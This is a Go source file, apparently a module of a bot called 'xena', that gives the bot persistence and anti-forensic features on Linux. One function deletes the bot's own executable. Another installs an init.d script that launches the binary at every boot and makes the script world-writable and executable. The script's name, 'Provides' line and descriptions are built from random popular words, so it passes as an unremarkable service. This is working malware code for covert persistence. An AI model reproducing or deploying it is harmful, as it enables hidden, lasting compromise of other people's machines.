package modules

import (
	"os"
	"time"
	"xena/helpers"
)

// Hash value of the bot's binary.
var SelfHash string

// scriptNameBySelfHash generates a file name based on the bot's hash.
func scriptNameBySelfHash() (string, error) {
	return helpers.RandomPopularWordBySeed(helpers.IntegersFromString(SelfHash)+512) + "_" + helpers.RandomPopularWordBySeed(helpers.IntegersFromString(SelfHash)+1024), nil
}

// RemoveBinary deletes the bot's binary file.
func RemoveBinary() error {
	selfPath, err := os.Executable()
	if err != nil {
		return err
	}

	err = os.Remove(selfPath)
	if err != nil {
		return err
	}

	return nil
}

// CheckIfPersisted returns true if it recognizes that the bot is already persistent within the environment.
func CheckIfPersisted() bool {
	switch GetOsDetails().Os {
	case "linux":
		scriptName, err := scriptNameBySelfHash()
		if err != nil {
			return false
		}

		_, err = os.Stat("/etc/init.d/" + scriptName)
		if err != nil {
			// We cannot make via LSBInitScripts.
			return false
		}

		return true
	}

	return false
}

// Persist returns true if the executable was persisted within the environment.
func Persist() error {
	switch GetOsDetails().Os {
	case "linux":
		executablePath, err := os.Executable()
		if err != nil {
			// Couldn't get the full path of the bot's executable.
			return err
		}

		currentTime := time.Now().UnixNano()

		scriptContent := "#! /bin/sh"
		scriptContent += "\n### BEGIN INIT INFO"
		scriptContent += "\n# Provides:          " + helpers.RandomPopularWord()
		scriptContent += "\n# Required-Start:    $local_fs"
		scriptContent += "\n# Required-Stop:     $local_fs"
		scriptContent += "\n# Default-Start:     2 3 4 5"
		scriptContent += "\n# Default-Stop:"
		scriptContent += "\n# Short-Description: "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime) + " "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime-2) + " "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime-4) + " "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime - 6)
		scriptContent += "\n# Description:       "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime-8) + " "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime-16) + " "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime-32) + " "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime-64) + " "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime-128) + " "
		scriptContent += helpers.RandomPopularWordBySeed(currentTime - 256)
		scriptContent += "\n### END INIT INFO"
		scriptContent += "\n\n../.." + executablePath

		_, err = os.Stat("/etc/init.d")
		if err != nil {
			// We cannot make via LSBInitScripts.
			return err
		}

		scriptName, err := scriptNameBySelfHash()
		if err != nil {
			// Failed to generate the start up script's name.
			return err
		}
		scriptPath := "/etc/init.d/" + scriptName

		// Create our start up script.
		scriptFile, err := os.Create(scriptPath)
		if err != nil {
			// Failed to create the script file.
			return err
		}
		scriptFile.WriteString(scriptContent)

		if err := os.Chmod(scriptPath, 0777); err != nil {
			// We're unable to make the script executable.
			return err
		}

		return nil

	default:
		return nil
	}
}
